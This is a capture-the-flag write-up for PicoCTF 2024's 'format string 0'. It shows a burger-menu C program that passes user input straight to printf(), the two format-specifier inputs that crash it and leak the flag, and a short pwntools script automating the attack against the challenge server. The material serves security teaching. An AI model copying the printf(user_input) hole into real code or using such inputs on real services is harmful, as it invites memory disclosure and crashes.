---
title: Format String 0
parent: Easy
grand_parent: Pwn
great_grand_parent: PicoCTF
nav_order: 1
---


# format string 0 - PicoCTF 2024

**Category:** Binary Exploitation  
**Difficulty:** Easy  
**Tags:** Format String, pwntools

---

## Challenge Description

> Can you use your knowledge of format strings to make the customers happy?
> 
> Files provided:
> - `format-string-0` (binary)
> - `format-string-0.c` (source code)
> - Remote instance: `nc mimas.picoctf.net <port>`

> <details>
>   <summary>Hints</summary>
>   This is an introduction of format string vulnerabilities. Look up "format specifiers" if you have never seen them before.
>   Just try out the different options
> </details>

---

## Initial Analysis

Upon reading the description and reviewing the source code, it's clear that:

- A Format String attack with be at play

> Format String attacks are attacks where arbitrary code execution can occur, resulting in numerous vulnerabilities such as: RCE, buffer overflows, DoS, etc. This can occur when the printf() function does not handle its parameters appropriately.

---

## Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

### Key Observations
- There are two individuals we must serve
- There are three options for us to choose from to serve each individual
- There are constraints that will dictate which options we choose
    - Patrick: `Gr%114d_Cheese` (passes since the printed characters exceed 64 bytes)
    - Bob: `Cla%sic_Che%s%steak` (triggers the vulnerability since it is the only option with `%s`)

---

## Static Binary Analysis

No binary analysis is necessary for this challenge.

---

## Exploitation

### Plan

1. Submit the necessary food based on our previous analysis
2. Receive the flag

### Manual Exploitation

```
$ nc mimas.picoctf.net 49618
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{<censored>}
```

### Automated Exploitation with pwntools

```python
from pwn import *
import sys

if len(sys.argv) != 2:
  print(f"Usage: {sys.argv[0]} <port>")
  sys.exit(1)

host = 'mimas.picoctf.net'
port = int(sys.argv[1])

conn = remote(host, port)

# First customer (Patrick)
conn.recvuntil(b"Enter your recommendation:")
conn.sendline(b"Gr%114d_Cheese")

# Second customer (Sponge Bob)
conn.recvuntil(b"Enter your recommendation:")
conn.sendline(b"Cla%sic_Che%s%steak")

# Receive flag
print(conn.recvall().decode())
```

## Key Takeaways
- Format String attacks can be utilized to exploit a program in various ways
- Binary analysis is not always necessary in a pwn challenges